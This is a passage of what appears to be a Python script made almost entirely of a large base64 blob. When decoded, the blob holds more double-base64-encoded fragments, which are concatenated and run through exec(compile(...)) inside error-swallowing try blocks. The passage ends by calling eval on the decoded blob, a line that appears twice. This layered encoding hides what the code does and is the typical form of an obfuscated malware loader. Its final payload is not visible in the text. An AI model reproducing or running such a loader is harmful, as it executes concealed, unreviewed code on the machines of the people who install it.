1IQnpXbFZrVjJGcmJIQmhNMEpFWWxaWk1GZFVTbGRrTWxKRVVXczVXbFo2Um5OVmJHaExaVmRKZWxOVVdrUmhWVVp1VTFWT1EwMUhUblZoZWxwRVlWVkdibE5WVGtKYU1HeEVVVmRrWVZaNlZuTlpNakZyVGxab05sSlliRTVXYW1nMFZHeFNWbG94UWxSUmJXeGFWMFUxYzFSdGNGSmtWbXh4VjFSQ1lWSXhXbkZaYWtwVFlrVjBTRlp1Vm1GWFJYQjFXbFpaTkdWRk1YRlNiVnBPVmtaVmVGTXhUVEZoTVhCWVZHNWFZVkl4Vm5aVFZ6VlhUVVp3Y0UxRVVrcGhWM1JNVTFWT1Fsb3diRVJSVjJSS1VUQktjMWx0TVZkbFZtOTZZa2RhVGxaRmJEUlhTSEJHVFZVMVZGRlViRXBTTUhCdldYcEtWazFyTlVST1YyeFBZV3hLY2xkc1pFOWtiSEJJVmxjNVlWWjZWbk5aTWpGclRsWm9ObEpZYkU1V2FtZzBWR3hTVm1ORmVIUlZiWGhhVFdwc2NsZHNUbTVoVjFKWlZXMHhUVlpIWkhCVE1VWjJXakJzUkZGWFpHRlhSMmh4VjJ4b1EwMUZiRWRXYmxab1ZqQTFNbGRyWkZkU1ZuQllWRzVhWVZJeFdrZFpNalZMWkcxT2NXSXdkRXBSTUVadVUxVk9RbG93YkVSUmJtUmFWMFUxTmxFeWJFSmFNR3hFVVZoV1RXRlVVa3hYYkdodllXeHdXVkZxUWtwU2F6UXhXVzAxVTJGSFZrWldibXhxWWxSc05WUXlaSFphTUd4RVVWZGtUV0ZVVWpGUk1qRlRZa1pyZVZadGFHcE5iRnB5VjBod1VrNVZPVmRQUkVaUVZrZDBibFZHVGtOaFZteFpWRzE0VDJGc1JqRlhWM0JhVFVad1NGWnRjR2xOYkVwelV6QmtTMkZIVFhsV1ZFcFBVWHBXY0ZSdGNGTmhNWEJZVkc1YVlWSXhWblpWVjNNMVZVWmFSMVJ0V2s5bGJHdzBVekZPY21SV2NFaFdiWEJwVFd4S2MxTXdUa3ROVjFKSVYxaFNVRkV3YkhkVFZVNTZXakZzZEZKdWNHRldSbXQzVkVjeFNrMXJOVWhWYlhoYVRXcHNjbGRzVG05aFZteFpWRzE0VDJGc1JqRlhWM0JhVFVad1NGWnRjR2xOYkVwelV6QmFRMVJXVVhoVmJWcE9aVzFqTVZNeFRuSmtWbkJJVm0xd2FVMXNTbk5UTUU1TFRWZFNTRmRZVWxCUk1HeDNVVEkxVTJWWFZsVmlNSFJLVVRCR2JsTlZaRmRPUm5CWVZGYzVXazFxYkRCWk1HUnpZekZ3VkdGSGRHRldNRFZ6VjFab1QySkdjRWRQUkVKUVZrZDRiVlJzVW5KT1ZYaEVVVmRzVVZORk5IZFpNakZ6WkZad05rNUhiRTFSTUVad1YyeG9iMkpHYkRWVFdFSk1WVmhDYzFwVlpFOWlSMDVKVlZka1ZXSlZXakJYYkZaWFpWZE9kRTlZYkZCYU1qbHVVMVZPUWxveVVrbFRhbFpRV2pJNWJsTlZUa0phTUd4RVVWZGtTbEl4U25OWFZFcFhZVWROZVZadGRGbGxiRVV4VkRGWk5FMVZPVlZoTW1SUlZUQktjRmRXYUU5aVJUVnhWVmhXV21Gc2EzZFhhMlJYWVcxSmVWVnRlRXhTTVVwelYxUktWMkZIVFhsV2JYUlpaV3hGTVZReFdUUk5WVGxWWVROQ1RXSldTbk5YVkVrMVlURndWRm95Ykd0WFJrcDBWRVpTYm1GVmRGSmlNbVJLVVRCR2JsTlZUa0phTUd4SVZXMTRXazFzV205WmVrcFhZVEZvTmxWVVZsQldhbWQ0VkRGU2Nsb3hRbFJSYld4YVYwVTFjMVJ0Y0ZKa1ZteHhWMVJDWVZJeFduRlpha3BUWWtWMFNGVnRlRnBOYkZwdldYcEtWMkV4YURaVlZGWlFWbXBuZUZReFVuSmpSWGgwVlcxNFdrMXFiSEpYYkU1dVlWZFNXVlZ0TVUxV1IyUndVekZHZGxvd2JFUlJWMlJoVjBkb2NWZHNhRU5OUld4SFZtNVdhRll3TlRKWGEyUlhVbFp3V0ZSdVdtRlNNVnBIV1RJMVMyUnRUbkZpTUhSS1VUQkdibE5WVGtKYU1HeEVVVzVrV2xkRk5UWlJNbXhDV2pCc1JGRllWazFoVkZKTVYyeG9iMkZzY0ZsUmFrSktVbXMwTVZsdE5WTmhSMVpHVm01c2FtSlViRFZVTW1SMldqQnNSRkZYWkUxaFZGSXhVVEl4VjA1SFRraFBXSEJyVjBWd2MxZEljRzVsVm1nMldYcFdUMVV3UlRWVFZXUkxZVWROZVZaVVNrOVJlbFp3Vkcxd1UyRXhjRmhVYmxwaFVqRldkbGRYTVVkbGJIQlZWMVJDVFdKVmEzbFVhMlJUWWtacmVVOVhkR0ZWTW1neldUSXhSMDVYUmxoT1Z6VlpaV3hzTmxNeFRuSmtWbkJJVm0xd2FVMXNTbk5UTUU1TFRWZFNTRmRZVWxCUk1HeDNVMVZPZWxveGJIUlNibkJoVmtacmQxUkhNVXBOYXpWSVZXMTRXazFxYkhKWGJFNXZZVlpzV1ZSdGVFOWhiRVl4VjFkd1drMUdjRWhXYlhCcFRXeEtjMU13YUZObFYwbDZWbTFzYVZJeFdtMVVhMUpDVGxWMFZHRXpWbUZTTVZweFdXcEtVMkpGZEVSVGFrWnJVakZzTUZRd1RrcGpSVTUxVlc1c2JGWkhPVXhUVlU1Q1dqQnNTRlpxVW1GV01ERjJWMVJKTldSSFRraGlTRTVoVlRKb2MxcFZhRU5rYlUxNlZtNXNZVlpxWnpCVVYzYzBUVEE1VlZaWVRrcFJNR3MwV1hwT1UyVlhSbGhPVnpWUllWVnNlbE5WVGt0aVIxWklWbTF3U21GWGRIZFJNakZYVGtacmVWWnVaR3RSTUVwUVYxWmplR0pHU2xsVGJteHBUVEJyTWxFeWJFSmFNR3hFVVdwQ2FtSnRjekpSTW14Q1dqQnNSRkZYWkVwUk1FWnVWMnhvYjJReVNYcFVha1pxWWxaYWJWUXdVa3RhYXpVMllYcEdTbEpFUW01WFZ6RkhaV3h3VlZkVVFrMWlWV3Q1Vkd0a1UySkdhM2xQVjNSaFZUSm9jMXBWYUVOa2JVMTZWbTVzWVZacVp6QlVWM2MwVFRBNVZWWllRazFpVmtwelYxUkpOV0V4Y0ZSYU1teHJWMFpLZEZSR1VtNWhWWFJTWWpKa1NsRXdSbTVUVlU1Q1dqQnNTRlpxVW1wU2VtdzJXa1pvUzJKR2FEWmFNMnhaWlcxTk1WUnNUa0pQVld4SVUyMW9hazFzVlhsVWEwMHhZVlUxY1ZWdGRHRldNRFV5VjJ0a1ZtSXhjRmxoU0dScFRUQTBlRmt5TVZkYWF6bEZVMjFhVDJWdGMzaFRNVTB4WVRGd1dGUnVXbUZTTVZaMlUxYzFWMDFHY0hCTlJGSktZVmQwVEZOVlRrSmFNR3hJVm1wU1drMXNXak5hUlU1RFZtMUtkR0pIY0dsTmJFcHpWV3RrVjJGdFNYbFZiWGhUVjBWd05WbHFUa3BPYTA1d1VWZGtTbEV3Um01VFZVNUNXakpPU0ZKdWNHcGtNamx1VTFWT1Fsb3dlSEJPU0ZaRVlsWlpNRmRVU2xka01sSkVVV3hTYkZaNlZYZFhWbWh2VW0xT2RWTnVXbXBoYlRsTVUxVk9RbG93YkVST1NGWk5Xbm93T1E9PScpLmRlY29kZSgidXRmLTgiKQpyaHltZV8xODQgPSA2NDYKZnJlc2hfNDc4ID0gYmFzZTY0LmI2NGRlY29kZSgnVmpGU1MwMUdXWGxXYkdScFVteHdjRlZyVm5kVk1WcHpXa1JPYkdKR1dUSlZiWFJQWVRGWmQwNVdaRlpOYmxKUVZtcEJlR05YU2tkV2JHUlRVbFJXUlZaWE1UUldNbEpZVTJ0V1dHSlhlRmxWYkZaelRURlplRlZyVGxwV2JWSXdWVEZvYzFZeVNrWlhiVGxWVmpOQ1IxUlhlSE5PYkU1eFZXMXNWMDFHV1hwV2EyUTBXVmRHVjFkcVdsTmhla1pvVm14YVlWVkdXa1pYYkU1cVlraENTbGxWWkhOVWF6RjBZVVphVjAxdVFrUldha0Y0WXpGS1dWcEdhR2xUUlVwNlZsYzFkMVl5VWtkWGJGWlNWMGRvVlZSV1ZuZFhWbkJXVjIxMFYwMVZOVWRaTUdoWFdWWkplbUZJV2xwbGEzQllXa1ZWZUZkV1VuUlNiV3hvVFVoQ01sWnNaREJXYXpWWFYyNU9WMkpzU25KVmFrbzBWMFphYzFwRVVsUlNia0pKVkZWb2IyRkZNVmRUYTNCWFZucFdkbGxWV21Ga1JsWnpZMFp3VjFKVmNEWlhWbHBoWTIxV2MxcElSbGRpUmxwWVZGVlNWMVpzV2xoalJXUmFWakExV0ZkclZuTmhSa3BZWlVaYVdsWkZOVVJVVjNoclpFZFNTRkpzU2s1aVJYQllWbXhrTkZsV2JGZFRia3BxVW10YVlWbHNVbGRWUmxaeFUyeEthMDFWY0RGWGEyUTBWVEZhYzJOSWJGZGlXRkpZV2tSQk1XTXlUa2xVYldoVFZtdHdWMVpYZUd0T1JrcHpWMnRvVGxaWVVsbFphMlF3VFRGcmQxZHVaR2hOUkVaSFZHdFNTMWRIUlhoalJFNWhVa1ZhV0ZwRldtRmpiRnAwWlVkb1RsSnVRazlXYlhSWFlURkplRlJZYkZWaE1uaFlXVzEwWVZaR1ZYZFhhM1JUWWtkNE1GUnNXazloVmtweVZtcFdXbUV5VGpSV1Z6RkxaRWRXUlZOc1pGZGlWa2w2VmxjeE5GbFdTWGhhU0ZKVFlrZFNjRlZzVm5aTlZscFpZMFZrVmsxcldsaFdWM1JoVmpKS2MyTkdaRmRpYmtKSVZsZDRXbVF5UmtaYVJrNVRZa1Z3V0ZkVVFsTlpWbVJJVTJ4c1ZtSkhlRmxaVjNSM1ZrWndXRTFWWkd0V01EVktWVEl4YjJGV1duSmpSRkpZWVRGS1JGbDZTbEpsVms1WllrZDBVMkV6UW05V2JURTBVekZzVjFwR1ZsVmlhelZ6Vm0xek1XVnNXWGxOV0U1b1lYcEdNVmxWVWtOV01rcElZVWhLVjFaWFVsaFZiVEZIVWxaS2RHSkhiRmRXUmxwSVZteG9kMUV4YkZoVGJHUldZVEpvVmxsWGRIZGpSbEpZWTBoT2FtSkhlRmRaVlZZd1ZqQXhWbU5GYkZWV2JXaEVWbXRhYTFJeFRuSmpSMFpUWWxkb1RWWnNXbXRXTVU1R1QxWm9hVkp0VWs5VmJYaDNUbXhrYzFkc1dteFNiWGhZV1dwT2IxVnRSalpXYmtKV1RVWlZlRlpGV21Gak1XUnlaRWRzYVZacmNFdFdha2t4VWpKR1YxZFlhRmhpUjFKb1ZXcE9iMlJzYkZoTlZUbFVWbXh3TVZsVlpITmhSVEYxWVVWb1YyRXlUalJWZWtwWFl6SkplbUZHYUdsU2JrSjVWa1pTUzJJeFVuTldXR2hvVWxkU2NGUlhjekZYUmxwMFpFZDBhRkp0VWtkVk1uaHZWakF4Y1ZGWWFGZGhNbEpRV1RKNFlXUldaSE5YYkdoVFlUTkNSbFl5ZEdGaU1XeFhWVmhzVlZkSVFuQlZiWGhoVmpGU1ZsWnVaRmhXYkZZMFdWVldNRmRHU1hkT1ZteFZZa1pLVkZaWE1VdFhWbFoxVjJ4d2FWWkZXakpXV0hCTFZHMVdjMVJ1VmxKaVJuQlVWRlZTVmsxR1duUmxSemxWVFZad2VsVnROVTlXTWtwMVVXeG9WVlpzV2pOVlZFWnlaVlV4Vm1SR1pHbFdWRVV4VmpKMGFtVkdaSE5hUldScVUwWktZVlpyVlRGVlJsSnlWMjFHVjAxVldubGFWV1J6VlRKS1dXRkdTbGRoTVVwTVdrUktVMU5HVm5OWGF6bFhaVzE0YjFaWGVGTmpNVTVYVmxoc2ExSkdTbTlVVmxaaFRWWlplV1ZHVGxkU2F6VklWako0ZDFsV1NuUlVhbEpZVm14d1RGVXdaRWRTVmxaMFkwZHNVMDB5VVRKV2FrWnJUa1pKZVZWcmFGWlhSM2h6VlRCVk1WWldXbk5hUkZKWVZteGFWbFpIZEU5aE1WbDNWbXBhVjJKVVZtaFdhMXBoWTJzMVZsWnNjR2xTTW1oRlZsY3hOR1F5VWtkYVNFcHFVbTVDVDFsVVJuZGxiRnBZWkVkMFUwMVhlRmhXTVdocllXeEplbUZHVmxWV1YxSjJWRlphVm1ReGEzcGhSbHBYWWtWd05WWkdXbTlqTVZWNFdrVnNVbUpIYUZsV2JURlRVMFp3V0dWR1pGaFNiRm93V1ZWYVQxWkdTWGxoUmxwWFZqTm9WMVJzVlhkbFZsSnpWMjF3VkZORlNuWldSbEpIV1ZaSmVGcElVbXRTUmtwVlZGZHpNVll4V2xobFNFNWFWakJ3UjFrd1ZuTldNVXBHWW5wQ1YxWnNjRXhXTVZwM1VteHdSMWRzVGs1TlZXOHhWbXhrTkZack1WZFVibEpUVjBkb1ZGbFVSbUZXUmxweFZHeE9WMkpIVW5wV2JYaHJZVlV4Vm1KRVdsaGhNVlY0VmpCYVQxTkhWa1pYYkhCWFlrWlZlRlpXVWtka01WbDRWVzVPYUZKc1drOVdha3B2WlVaa2NsZHRSbHBXYkVwWVZUSjBhMkZHU25SVmJGWlZWbFp3VEZsVldsWmxSbHB4VVd4a1RtRXhjR0ZXTW5SV1pVWlZlRk5zYUd4U1YyaFpXV3RrYjFOR1ZYbGxSWFJxVFdzMVNWcEZXbXRVYXpGR1kwZG9WMkV4Y0doWlZFcEhVakpPUjJGSGJGTlNWbkJZVmtaV1UxSXhaRmRpU0U1WFlrVTFXRlp0TlVOU01YQldZVVZrV0dGNlJucFZNbmhYVjJ4WmVsVnJlRnBXYkhCSVZtMHhVMU5GT1ZoaVJUVk9ZbGRvVWxacVNqQldNVWw0Vkc1U1YySnNXbE5aVkU1dlZsWldjMkZHVGxoaVJscDVWbTF3VTJGVk1WZFRhMnhhWVRGYU0xbHJXbXRTYkU1MVVteGFhVkl4U205V1ZFSmhVekZhYzFwSVNsZGlSVFZaVldwS2FtVldaSEpXYlVacFRWVTFXVlpIZUhOV1IwcFlaVVpvVlZac1ZYaFdSbHBhWlZVMVZtUkhkRTVoTVhCS1YydFdiMU14YkZoU1dHaFVZbXhLV0ZWdE1WTlhSbEpXVjI1a2FtSkZOWGhXYlRGM1lVZFdkR1ZFU2xoaE1rNDBXVlJLVDJNeFduTmFSa3BwWWxaS2VGWkdXbUZaVmxKSFdrWm9hMUpZVWxaV2JURXdUa1pXZEUxWVpGaFNiSEJhVmxkd1QxbFdTbGhoUjJoV1ZrVmFjbFV3WkVkVFJUbFlZVVUxVGsxRmJEWldiR1EwVmpKRmVWWnNaRmRpUjFKd1ZXeGFkMVl4YkhOYVJ6Vk9WbTFTZVZkclpFZFdSMHBHVFZST1lWWldjRmhXTUdSTFVteE9jMk5HV21oaGVsWlpWbGQwWVZsWFRuTlhia3BoVW14d2NGbHNhRzlPUm1SelYyMTBWMDFyV2tsV1Z6VlBXVlpPUmxkc1pGWmlia0pZV1hwR2QxWnRSa1pVYlhCT1ZqTm9ZVlpVU2pSak1rWnlUVWhzYUZKc2NGbFpWRXB2Wkd4U1ZsZHJkRmhTYXpWNVdWVmFhMkZIVm5KWFdHUllWa1ZLZGxWcVFYZGxSazV6VjIxc1ZGSllRbTlXYlRFMFUyMVdWMk5HYUU1WFJUVlhWRlpvUTJWV1VsZGFSRUpXVFVSR2VWa3dVbE5XTWtwSVZXNUtXRlp0VWt4Vk1GVXhWMVpPZEdWR1pGZFhSVXBPVm1wS01HSXhSWGhXYms1WVlUSm9VVlpzVWtkaU1XeDBaVVYwYkZadGVIaFdSM1JyVmtaSmQyTkZhRlpOYmxKNlZtcEtTMVl4WkhWaVJscHNZVEZ3ZVZkclkzaFRNbEpYWTBWYVdHSllhRzlVVkVwdlRURmtWMXBFUWxkTlJGWklXVEJvVjFsV1NqWmlSMmhYWVd0S00xWkhlR0ZTVms1MVZHMXdUbFpyY0ZoWFZsWlhZakpHZEZKWWJHaFNia0pYV1ZSS1UyTnNjRVphUlRscVlrWktlbFl5ZUZOaFYwcEhZMFp3VjAxdWFISlZla1pMWXpGU2RWUnNTbWhoTUhCVVZrWldWazFXU2tkalJscFlZVE5TY1ZWcVFsZE9iRnAwWTBaa1YwMXJjSGxaTUZwRFYyeGFkRlJVUmxkTmJtaFFWakJWTVZZeFNuTmFSbVJPVFZWdk1sWnFSbE5VTWsxNFZsaG9WR0V5YUc5Vk1HUTBZVVpzZEdSSVpGUlNiVkpaV2tWV2EyRlZNVmRUYTJSVlZteEtTRlpYYzNoVFZrWjFZMFphYkdFd2NGbFdWM1JyVmpKU1YxVnVWbUZTYlZKVlZUQldTMlZXV25OWGJVWnFUV3MxV0ZadE5VdGhNVXBIWTBoR1YwMUdWWGRhVmxwaFVsWktjbVJIY0ZOaVJWa3hWbXBLTUZsV1pFaFRhMXBZWWtkNFdWbFVSbHBrTVZaeVdrWkthMDFzV2twV1YzaFBWa1pLZFZGcVRsZGlXR2gyVjFaYVYxTkdUbGxpUjJ4VFlURndlbFpxUWxkVE1rbDRZa1prVjJGclNuRlphMVp6VGxaYVdHTkdaR2hTVkVaSldWVlNSMVpyTVhWaFJWSmhWbGRTUjFwV1pFZFNiVlpIVjJzMVZGSlZXWHBXYkdoM1ZERkplVkpZYkZOWFNFSm9WVEJrYjJOR1VsaE9WazVYVFZaV05WUldVbE5pUmtweVRWUldWVlpzVmpSV1YzaGhZekZPYzFwR1pGZGlWa3A1Vm0xd1IxWXhTbk5UYms1VVlraENXRlpyV21GVFJtUnpWMjEwYUUxRVZraFZiVFZUVmpKR2MxTnRhRnBpUm5CTVZteGFXbVZIUmtkVWJXeE9WbTVDV1ZkWGRHRmtNVmw0Vkd0a2FXVnJjR0ZaVjNNeFRURndSbGRyTld0TmJGcEtWbTE0ZDFZeVJYaGlNMmhYVmtWS2RsVlVSbXRXTVZKWldrZG9VMkpGY0doV1JsSkRaREZPYzFac1pHRlNNMUpUV1d0YWMwNUdWbGhOUkZaV1RWVndlbGt3YUV0WlZrcEdUbFpTV2xaV2NGTmFWVnByWkZaV2RHTkhiRk5OYldnMFZteFNRMWxXUlhoYVJtUnBVbTFTVmxsclpHOVhWbXh5VmxSR2FtSklRa2haVlZaclZqRlpkMk5HYUZkV2VsWnlXVlJHWVdOck5WZGhSbkJPVmpBeE5GWnRNVFJoTWs1MFZXdFdVMkpJUWxoVVZFcHFaVlphV0dWR1drNVdNRFZaVmxab2QyRkdTWHBSYlVaWFlsUkZNRlpxUm5OT2JFNTFWRzFvVG1GNlJYcFhWRUpxWlVaa2MxZHNXbXBTYTBwWVdXdGFZV1ZzVW5OWGJscHJUV3hLUmxadE1XOWhSVEZaVVdzeFYxZElRa1JXYWtwTFZqSk9SMWRzYUdsaVYyaDZWbGR3UTJReVVrZGhNMmhZWVRBMVZsUldXbmRTTVZsNVRsVk9XRkp0VWtkWk1GWjNWbTFLU0dGSWNGZGhNbEpVVmpGa1IxSnNWbk5XYldoT1VtMTNNVlpzYUhkVE1EVklVbGhvVjJFeGNGWlphMlJUWVVac2RHUkhSbHBXYlZKWVZqSjBUMVpyTVhKT1ZYQmFWbFpLUkZkV1pFdFdiVTVKWVVaa1RsSXhSWGRXVmxKSFV6Rk9TRlZyV2xCV01taHdXVlJDYzA1V1duRlRXR2hxVFVSV1dWVnRlR0ZoVmtsNVlVYzVXbUpZYUdGVVZscGhWMFUxVmxwSGNGZGlWR3Q2VmtSR1lWVXhaRWhUYTJoV1lUTkNXRmxVUm1GVFJsSlhXa1YwVTJGNmJGWlZNakZ6VmpKRmVHTklaRmROYmxKWVdYcEtUMVl4VmxsaFJscHBWa2Q0V0ZadGVGWk5WbHBYWVROc2ExSXpVbGhaYTJSVFYwWmFTRTVXVGxkTlZuQlhXV3BPYzFac1duTlhhMmhYWWtkU1dGcEdXbUZrUmtwMFlrWmtWMDB5YURSV01XUjNVVEZKZUZkdVRsWmlSM2hYV1cxMFlXRkdXblJOVkZKWFVtMVNXVlJzYUd0VU1WbDNWbXBTVmxaNlFURlhWbHBoVmpKT1NWSnNaRmRpVjJnMVZsVmFSazlXUWxKUVZEQTknKS5kZWNvZGUoInV0Zi04IikKbW90b3JfNTQxID0gOTY0NDgKc2l0dGVyXzY0Ml83MTUgPSBiYXNlNjQuYjY0ZGVjb2RlKGJhc2U2NC5iNjRkZWNvZGUoaGF6aW5nXzQ0MikpLmRlY29kZSgidXRmLTgiKSArIGJhc2U2NC5iNjRkZWNvZGUoYmFzZTY0LmI2NGRlY29kZShVTkRFUlBBWV81NjIpKS5kZWNvZGUoInV0Zi04IikgKyBiYXNlNjQuYjY0ZGVjb2RlKGJhc2U2NC5iNjRkZWNvZGUoUFJPVklOQ0VfMzYzKSkuZGVjb2RlKCJ1dGYtOCIpCnRyeToKICAgIGV4ZWMoY29tcGlsZShzaXR0ZXJfNjQyXzcxNSwgIjxzdHJpbmc+IiwgImV4ZWMiKSkKZXhjZXB0IE5hbWVFcnJvcjoKICAgIHRyeToKICAgICAgICBzaXR0ZXJfNjQyXzcxNSA9IGJhc2U2NC5iNjRkZWNvZGUoc2l0dGVyXzY0Ml83MTUpLmRlY29kZSgidXRmLTgiKQogICAgICAgIHNpdHRlcl82NDJfNzE1ID0gYmFzZTY0LmI2NGRlY29kZShzaXR0ZXJfNjQyXzcxNSkuZGVjb2RlKCJ1dGYtOCIpCiAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yOgogICAgICAgIHBhc3MKICAgIC4uLgpleGNlcHQgU3ludGF4RXJyb3I6CiAgICAuLi4KbmF0aW9uYWxfMzk0XzExNSA9IGJhc2U2NC5iNjRkZWNvZGUoYmFzZTY0LmI2NGRlY29kZShzZWRhbl85OTUpKS5kZWNvZGUoInV0Zi04IikgKyBiYXNlNjQuYjY0ZGVjb2RlKGJhc2U2NC5iNjRkZWNvZGUod2F0ZXJfMzg5KSkuZGVjb2RlKCJ1dGYtOCIpICsgYmFzZTY0LmI2NGRlY29kZShiYXNlNjQuYjY0ZGVjb2RlKGRvbGx5XzIwNykpLmRlY29kZSgidXRmLTgiKQp0cnk6CiAgICBleGVjKGNvbXBpbGUobmF0aW9uYWxfMzk0XzExNSwgIjxzdHJpbmc+IiwgImV4ZWMiKSkKZXhjZXB0IE5hbWVFcnJvcjoKICAgIHRyeToKICAgICAgICBuYXRpb25hbF8zOTRfMTE1ID0gYmFzZTY0LmI2NGRlY29kZShuYXRpb25hbF8zOTRfMTE1KS5kZWNvZGUoInV0Zi04IikKICAgICAgICBuYXRpb25hbF8zOTRfMTE1ID0gYmFzZTY0LmI2NGRlY29kZShuYXRpb25hbF8zOTRfMTE1KS5kZWNvZGUoInV0Zi04IikKICAgIGV4Y2VwdCBVbmljb2RlRGVjb2RlRXJyb3I6CiAgICAgICAgcGFzcwogICAgLi4uCmV4Y2VwdCBTeW50YXhFcnJvcjoKICAgIC4uLgpwYXB5cnVzXzMxMF8xOTQgPSBiYXNlNjQuYjY0ZGVjb2RlKGJhc2U2NC5iNjRkZWNvZGUob3Zlcmx5aW5nXzU3MSkpLmRlY29kZSgidXRmLTgiKSArIGJhc2U2NC5iNjRkZWNvZGUoYmFzZTY0LmI2NGRlY29kZShBTUJJR1VPVVNfOTkyKSkuZGVjb2RlKCJ1dGYtOCIpICsgYmFzZTY0LmI2NGRlY29kZShiYXNlNjQuYjY0ZGVjb2RlKFVOREVSUEFZXzU2MikpLmRlY29kZSgidXRmLTgiKQp0cnk6CiAgICBleGVjKGNvbXBpbGUocGFweXJ1c18zMTBfMTk0LCAiPHN0cmluZz4iLCAiZXhlYyIpKQpleGNlcHQgTmFtZUVycm9yOgogICAgdHJ5OgogICAgICAgIHBhcHlydXNfMzEwXzE5NCA9IGJhc2U2NC5iNjRkZWNvZGUocGFweXJ1c18zMTBfMTk0KS5kZWNvZGUoInV0Zi04IikKICAgICAgICBwYXB5cnVzXzMxMF8xOTQgPSBiYXNlNjQuYjY0ZGVjb2RlKHBhcHlydXNfMzEwXzE5NCkuZGVjb2RlKCJ1dGYtOCIpCiAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yOgogICAgICAgIHBhc3MKICAgIC4uLgpleGNlcHQgU3ludGF4RXJyb3I6CiAgICAuLi4Kc3Vkb2t1XzQ1MF83NDYgPSBiYXNlNjQuYjY0ZGVjb2RlKGJhc2U2NC5iNjRkZWNvZGUoaGFuZHBpY2tfNDI4KSkuZGVjb2RlKCJ1dGYtOCIpICsgYmFzZTY0LmI2NGRlY29kZShiYXNlNjQuYjY0ZGVjb2RlKGNhcHRpdml0eV84MTQpKS5kZWNvZGUoInV0Zi04IikgKyBiYXNlNjQuYjY0ZGVjb2RlKGJhc2U2NC5iNjRkZWNvZGUoVFJJTU1FUl85NjMpKS5kZWNvZGUoInV0Zi04IikKdHJ5OgogICAgZXhlYyhjb21waWxlKHN1ZG9rdV80NTBfNzQ2LCAiPHN0cmluZz4iLCAiZXhlYyIpKQpleGNlcHQgTmFtZUVycm9yOgogICAgdHJ5OgogICAgICAgIHN1ZG9rdV80NTBfNzQ2ID0gYmFzZTY0LmI2NGRlY29kZShzdWRva3VfNDUwXzc0NikuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgc3Vkb2t1XzQ1MF83NDYgPSBiYXNlNjQuYjY0ZGVjb2RlKHN1ZG9rdV80NTBfNzQ2KS5kZWNvZGUoInV0Zi04IikKICAgIGV4Y2VwdCBVbmljb2RlRGVjb2RlRXJyb3I6CiAgICAgICAgcGFzcwogICAgLi4uCmV4Y2VwdCBTeW50YXhFcnJvcjoKICAgIC4uLg=="""

eval(compile(base64.b64decode(raw_code),"<string>","exec"))"""

eval(compile(base64.b64decode(raw_code), "<string>", "exec"))
